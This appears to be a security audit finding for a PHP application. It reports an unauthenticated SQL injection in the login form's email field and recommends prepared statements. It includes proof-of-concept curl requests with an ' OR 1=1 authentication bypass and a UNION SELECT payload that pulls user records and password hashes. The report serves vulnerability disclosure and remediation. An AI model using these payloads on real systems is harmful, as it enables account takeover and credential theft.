# Vulnerability: SQL Injection — Authentication Bypass via Login Email

## Summary
The `user/login.php` endpoint passes the `email` POST parameter directly into a SQL query via `sprintf` with `%s` formatting at line 15. Since `%s` performs simple string substitution without escaping, an attacker can inject arbitrary SQL to bypass authentication, extract data, or modify the database. No authentication is required to reach this sink.

## Confidence
High

## Authentication Requirement
Unauthenticated

## Attack Surface Location
- **Endpoint:** `POST /user/login.php`
- **Handler:** `user/login.php:1-44`
- **Middleware / Guards:** AumWAF (trivially bypassed)

## Attack Chain
1. **Initial access:** Attacker sends a POST request to `/user/login.php`. No authentication required.
2. **Endpoint interaction:** The login handler reads `post('email')` at line 12 and passes it to a SQL query.
3. **Malicious input:** `email` = `' OR 1=1 -- -` (authentication bypass) or `' UNION SELECT ... -- -` (data exfiltration).
4. **Sink execution:** `sprintf("SELECT * FROM tbl_users WHERE useremail = '%s'", $email)` at line 15, then `$mysqli->query($sql)` at line 16.
5. **Post-exploitation:** If `$_CONFIG['debug']` is also true (set via `?debug=1`), the full user row is printed including password hash. Attacker can also bypass auth entirely.
6. **Final impact:** Authentication bypass, data disclosure of all user records including password hashes.

## Data Flow
- **Source (user input):** `$_POST['email']`
- **Sink:** `$mysqli->query()` at `user/login.php:16`

```
$_POST['email'] → post('email') [common.php:32-33] → $email [login.php:12] → sprintf("SELECT * FROM tbl_users WHERE useremail = '%s'", $email) [login.php:15] → $mysqli->query($sql) [login.php:16]
```

## Proof of Concept

### Prerequisites
- None. Fully unauthenticated.

### Exploit Request — Authentication Bypass
```bash
curl -X POST "http://{{TARGET_HOST}}/user/login.php" \
  -d "email='+OR+1=1+--+&password=anything"
```

### Exploit Request — Data Exfiltration (with debug mode)
```bash
curl -X POST "http://{{TARGET_HOST}}/user/login.php?debug=1" \
  -d "email='+UNION+SELECT+1,username,userpass,useremail,5,6+FROM+tbl_users+WHERE+'1'='1&password=anything"
```

### Expected Vulnerable Response
Authentication bypass redirects to `index.php` with an authenticated session. With debug mode + UNION injection, the response contains user records including password hashes.

### Expected Patched Response
After parameterized queries, the injection returns "User Email doesn't exists." and login fails.

### Impact Demonstration
Attacker bypasses authentication to gain access to any account, and can extract all user credentials including bcrypt password hashes.

## Affected Code
```php
// user/login.php:11-16
if( !empty( post('email') ) AND !empty( post('password') ) ) {
    $email = post('email');
    $password = post('password');

    $sql = sprintf("SELECT * FROM tbl_users WHERE useremail = '%s'", $email);
    $q = $mysqli->query($sql);
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `POST /user/login.php` is a public endpoint with no authentication guard. The `email` parameter is read directly from `$_POST`.
- **Impact attack — FAILED to kill.** SQL injection on a `SELECT *` query enables authentication bypass and data exfiltration via UNION-based techniques.
- **Validity attack — FAILED to kill.** `sprintf('%s')` performs plain string substitution — no escaping, no parameterization. AumWAF blocks only tool-name signatures.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Use prepared statements:
```php
$stmt = $mysqli->prepare("SELECT * FROM tbl_users WHERE useremail = ?");
$stmt->bind_param("s", $email);
$stmt->execute();
$q = $stmt->get_result();
```